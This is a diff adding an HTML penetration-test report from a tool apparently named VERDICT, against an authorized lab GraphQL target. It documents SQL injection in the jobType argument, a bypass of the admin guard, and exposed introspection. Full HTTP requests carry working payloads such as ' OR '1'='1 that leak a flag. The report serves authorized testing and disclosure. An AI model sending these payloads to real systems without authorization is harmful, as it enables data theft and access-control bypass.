@@ -1,0 +1,218 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqy34r1n-oay9rf</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [sqli] SQL injection in GraphQL jobs(jobType) — auth filter bypass, private data disclosure</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [info-disclosure] Unauthenticated disclosure of admin-only private job (live secret/flag) by bypassing the &quot;admins only&quot; guard via SQLi on jobType</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] GraphQL introspection enabled + GraphiQL IDE exposed on unauthenticated /graphql</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqy34r1n-oay9rf</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32820/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T17:51:01.586Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32820</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#c9a227">1</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [sqli] SQL injection in GraphQL jobs(jobType) — auth filter bypass, private data disclosure</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32820/</div>
+<div class="desc">The `jobType` argument of the GraphQL `jobs(jobType: String!)` query (driven by the root-page job-type filter) is concatenated directly into a SQLite query without parameterization. A single quote payload returns a SQLite parser error (&quot;unrecognized token: \&quot;'''\&quot;&quot;), proving string-context concatenation. A boolean payload `' OR '1'='1` causes the WHERE clause to match every row, returning ALL jobs — including the `private` &quot;Hidden job&quot; whose description contains a secret flag. This simultaneously (a) confirms SQL injection and (b) bypasses the application-level access control that otherwise rejects jobType=&quot;private&quot; with &quot;Only admins can see private jobs&quot;. Unauthenticated. The GraphiQL playground is also exposed unauthenticated at /graphql/, easing exploitation.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:32820/graphql/ with Content-Type: application/json and body {&quot;query&quot;:&quot;{jobs(jobType:\&quot;zzznomatch\&quot;){id name type description}}&quot;} → returns {&quot;data&quot;:{&quot;jobs&quot;:[]}} (negative control: no rows).
+2. POST same endpoint with body {&quot;query&quot;:&quot;{jobs(jobType:\&quot;' OR '1'='1\&quot;){id name type description}}&quot;} → returns all 4 jobs including {&quot;id&quot;:3,&quot;name&quot;:&quot;Hidden job&quot;,&quot;type&quot;:&quot;private&quot;,&quot;description&quot;:&quot;flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}&quot;}, despite jobType=&quot;private&quot; being explicitly blocked for non-admins.
+3. Replay step 2 → identical full result set (stable).
+Single-quote confirmation: jobType=&quot;'&quot; → {&quot;errors&quot;:[{&quot;message&quot;:&quot;unrecognized token: \&quot;'''\&quot;&quot;}]} (SQLite error).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy395ez-a</code> — <code>artifacts/s-0001/ev-mqy395ez-a/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;query&quot;:&quot;{jobs(jobType:\&quot;zzznomatch\&quot;){id name type description}}&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 22
+content-type: application/json
+date: Sun, 28 Jun 2026 17:54:25 GMT
+server: uvicorn
+
+{&quot;data&quot;: {&quot;jobs&quot;: []}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3948h-9</code> — <code>artifacts/s-0001/ev-mqy3948h-9/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;query&quot;:&quot;{jobs(jobType:\&quot;' OR '1'='1\&quot;){id name type description}}&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 392
+content-type: application/json
+date: Sun, 28 Jun 2026 17:54:24 GMT
+server: uvicorn
+
+{&quot;data&quot;: {&quot;jobs&quot;: [{&quot;id&quot;: 1, &quot;name&quot;: &quot;Senior Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;reactjs&quot;}, {&quot;id&quot;: 2, &quot;name&quot;: &quot;Staff Backend Python&quot;, &quot;type&quot;: &quot;back-end&quot;, &quot;description&quot;: &quot;django&quot;}, {&quot;id&quot;: 3, &quot;name&quot;: &quot;Hidden job&quot;, &quot;type&quot;: &quot;private&quot;, &quot;description&quot;: &quot;flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}&quot;}, {&quot;id&quot;: 4, &quot;name&quot;: &quot;Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;angular&quot;}]}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy39bkw-b</code> — <code>artifacts/s-0001/ev-mqy39bkw-b/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;query&quot;:&quot;{jobs(jobType:\&quot;' OR '1'='1\&quot;){id name type description}}&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 392
+content-type: application/json
+date: Sun, 28 Jun 2026 17:54:33 GMT
+server: uvicorn
+
+{&quot;data&quot;: {&quot;jobs&quot;: [{&quot;id&quot;: 1, &quot;name&quot;: &quot;Senior Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;reactjs&quot;}, {&quot;id&quot;: 2, &quot;name&quot;: &quot;Staff Backend Python&quot;, &quot;type&quot;: &quot;back-end&quot;, &quot;description&quot;: &quot;django&quot;}, {&quot;id&quot;: 3, &quot;name&quot;: &quot;Hidden job&quot;, &quot;type&quot;: &quot;private&quot;, &quot;description&quot;: &quot;flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}&quot;}, {&quot;id&quot;: 4, &quot;name&quot;: &quot;Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;angular&quot;}]}}</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [info-disclosure] Unauthenticated disclosure of admin-only private job (live secret/flag) by bypassing the &quot;admins only&quot; guard via SQLi on jobType</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32820/</div>
+<div class="desc">The `jobs(jobType: String!)` GraphQL query enforces an authorization boundary at the resolver: requesting `jobType:&quot;private&quot;` is rejected with {&quot;errors&quot;:[{&quot;message&quot;:&quot;Only admins can see private jobs&quot;}]} and returns no data (negative control ev-mqy3gwlg-t, 135 bytes, data=null). However the resolver concatenates `jobType` into its SQL, so the guard is merely a literal-string check on the value &quot;private&quot;. An UNAUTHENTICATED attacker injects a boolean-true predicate (`zzz' OR 1=1-- -`) that (a) never equals the literal &quot;private&quot; so the admin guard is not triggered, yet (b) forces the underlying SQL to return ALL rows — including the admin-only private record (id 3, &quot;Hidden job&quot;, type &quot;private&quot;). Its description leaks a real, live, in-scope secret: flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}. This is the sensitive-data-disclosure impact (admin-only data exfiltrated by an unauthenticated user), distinct from the raw injection finding (sqli::/graphql::jobType) and from the introspection misconfig.</div>
+<div><b>Reproduction</b></div><pre>1. Negative control (guard works): POST /graphql/ with body {&quot;query&quot;:&quot;{ jobs(jobType:\&quot;private\&quot;){id name type description} }&quot;} → 200, data=null, error &quot;Only admins can see private jobs&quot; (ev-mqy3gwlg-t, 135 bytes).
+2. Exploit: POST /graphql/ with body {&quot;query&quot;:&quot;{ jobs(jobType:\&quot;zzz' OR 1=1-- -\&quot;){id name type description} }&quot;} → 200, returns 4 jobs incl. id 3 type &quot;private&quot; with description flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9} (ev-mqy3i7z1-w and ev-mqy3i90s-x, both 392 bytes, stable across replays).
+The injected predicate is never literally &quot;private&quot; so the admin guard is skipped, while OR 1=1 forces the protected row to be returned. No authentication or admin role required.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3gwlg-t</code> — <code>artifacts/_/ev-mqy3gwlg-t/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;query&quot;:&quot;{ all: jobs(jobType:\&quot;\&quot;){id name type description} priv: jobs(jobType:\&quot;private\&quot;){id name type description} }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 135
+content-type: application/json
+date: Sun, 28 Jun 2026 18:00:27 GMT
+server: uvicorn
+
+{&quot;data&quot;: null, &quot;errors&quot;: [{&quot;message&quot;: &quot;Only admins can see private jobs&quot;, &quot;locations&quot;: [{&quot;line&quot;: 1, &quot;column&quot;: 51}], &quot;path&quot;: [&quot;priv&quot;]}]}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3i7z1-w</code> — <code>artifacts/_/ev-mqy3i7z1-w/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;query&quot;:&quot;{ jobs(jobType:\&quot;zzz' OR 1=1-- -\&quot;){id name type description} }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 392
+content-type: application/json
+date: Sun, 28 Jun 2026 18:01:29 GMT
+server: uvicorn
+
+{&quot;data&quot;: {&quot;jobs&quot;: [{&quot;id&quot;: 1, &quot;name&quot;: &quot;Senior Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;reactjs&quot;}, {&quot;id&quot;: 2, &quot;name&quot;: &quot;Staff Backend Python&quot;, &quot;type&quot;: &quot;back-end&quot;, &quot;description&quot;: &quot;django&quot;}, {&quot;id&quot;: 3, &quot;name&quot;: &quot;Hidden job&quot;, &quot;type&quot;: &quot;private&quot;, &quot;description&quot;: &quot;flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}&quot;}, {&quot;id&quot;: 4, &quot;name&quot;: &quot;Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;angular&quot;}]}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3i90s-x</code> — <code>artifacts/_/ev-mqy3i90s-x/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;query&quot;:&quot;{ jobs(jobType:\&quot;zzz' OR 1=1-- -\&quot;){id name type description} }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 392
+content-type: application/json
+date: Sun, 28 Jun 2026 18:01:30 GMT
+server: uvicorn
+
+{&quot;data&quot;: {&quot;jobs&quot;: [{&quot;id&quot;: 1, &quot;name&quot;: &quot;Senior Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;reactjs&quot;}, {&quot;id&quot;: 2, &quot;name&quot;: &quot;Staff Backend Python&quot;, &quot;type&quot;: &quot;back-end&quot;, &quot;description&quot;: &quot;django&quot;}, {&quot;id&quot;: 3, &quot;name&quot;: &quot;Hidden job&quot;, &quot;type&quot;: &quot;private&quot;, &quot;description&quot;: &quot;flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}&quot;}, {&quot;id&quot;: 4, &quot;name&quot;: &quot;Frontend Dev&quot;, &quot;type&quot;: &quot;front-end&quot;, &quot;description&quot;: &quot;angular&quot;}]}}</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [info-disclosure] GraphQL introspection enabled + GraphiQL IDE exposed on unauthenticated /graphql</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32820/</div>
+<div class="desc">The unauthenticated POST /graphql/ endpoint (Strawberry GraphQL) has introspection fully enabled, disclosing the complete schema to any anonymous client: Query.jobs(jobType: String!): [Job] and the Job object type (id, name, type, description); mutationType and subscriptionType are null. In addition, GET /graphql/ serves the interactive GraphiQL IDE unauthenticated. Schema disclosure is the reconnaissance primitive that directly reveals the jobType scalar argument exploited by the confirmed SQL injection (sqli::/graphql::jobType) and would expose any future resolvers/arguments to attackers. Defense-in-depth: production GraphQL endpoints should disable introspection and the GraphiQL IDE.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:32820/graphql/ with header Content-Type: application/json and body {&quot;query&quot;:&quot;{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}}}}}&quot;} → 200, full schema returned (data.__schema populated) [ev-mqy3bbcg-i, ev-mqy3dpft-m].
+2. Negative control — request a non-existent introspection field {&quot;query&quot;:&quot;{__schema{__nonexistent_field_xyz}}&quot;} → 200 with data:null and a validation error, no schema disclosed [ev-mqy3d9lo-l].
+3. GET http://target.local:32820/graphql/ → 200 text/html serving the Strawberry GraphiQL IDE unauthenticated [ev-mqy3bc13-j].</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3d9lo-l</code> — <code>artifacts/s-0002/ev-mqy3d9lo-l/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;query&quot;:&quot;{__schema{__nonexistent_field_xyz}}&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 149
+content-type: application/json
+date: Sun, 28 Jun 2026 17:57:37 GMT
+server: uvicorn
+
+{&quot;data&quot;: null, &quot;errors&quot;: [{&quot;message&quot;: &quot;Cannot query field '__nonexistent_field_xyz' on type '__Schema'.&quot;, &quot;locations&quot;: [{&quot;line&quot;: 1, &quot;column&quot;: 11}]}]}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3bbcg-i</code> — <code>artifacts/s-0002/ev-mqy3bbcg-i/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;query&quot;:&quot;{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}} }}}}&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 3057
+content-type: application/json
+date: Sun, 28 Jun 2026 17:56:07 GMT
+server: uvicorn
+
+{&quot;data&quot;: {&quot;__schema&quot;: {&quot;queryType&quot;: {&quot;name&quot;: &quot;Query&quot;}, &quot;mutationType&quot;: null, &quot;types&quot;: [{&quot;name&quot;: &quot;Query&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;jobs&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;jobType&quot;, &quot;type&quot;: {&quot;name&quot;: null, &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;ofType&quot;: {&quot;name&quot;: &quot;String&quot;, &quot;kind&quot;: &quot;SCALAR&quot;}}}]}]}, {&quot;name&quot;: &quot;Job&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;id&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;type&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;Int&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;String&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;__Schema&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;types&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;queryType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;mutationType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;subscriptionType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;directives&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: null, &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;ofType&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;}}}]}]}, {&quot;name&quot;: &quot;__Type&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;kind&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;specifiedByURL&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;fields&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;interfaces&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;possibleTypes&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;enumValues&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;inputFields&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;ofType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isOneOf&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__TypeKind&quot;, &quot;kind&quot;: &quot;ENUM&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;__Field&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;args&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;type&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__InputValue&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;type&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;defaultValue&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__EnumValue&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__Directive&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isRepeatable&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;locations&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;args&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__DirectiveLocation&quot;, &quot;kind&quot;: &quot;ENUM&quot;, &quot;fields&quot;: null}]}}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3dpft-m</code> — <code>artifacts/s-0002/ev-mqy3dpft-m/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql/ HTTP/1.1
+Host: target.local:32820
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;query&quot;:&quot;{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}} }}}}&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 3057
+content-type: application/json
+date: Sun, 28 Jun 2026 17:57:58 GMT
+server: uvicorn
+
+{&quot;data&quot;: {&quot;__schema&quot;: {&quot;queryType&quot;: {&quot;name&quot;: &quot;Query&quot;}, &quot;mutationType&quot;: null, &quot;types&quot;: [{&quot;name&quot;: &quot;Query&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;jobs&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;jobType&quot;, &quot;type&quot;: {&quot;name&quot;: null, &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;ofType&quot;: {&quot;name&quot;: &quot;String&quot;, &quot;kind&quot;: &quot;SCALAR&quot;}}}]}]}, {&quot;name&quot;: &quot;Job&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;id&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;type&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;Int&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;String&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;__Schema&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;types&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;queryType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;mutationType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;subscriptionType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;directives&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: null, &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;ofType&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;}}}]}]}, {&quot;name&quot;: &quot;__Type&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;kind&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;specifiedByURL&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;fields&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;interfaces&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;possibleTypes&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;enumValues&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;inputFields&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, 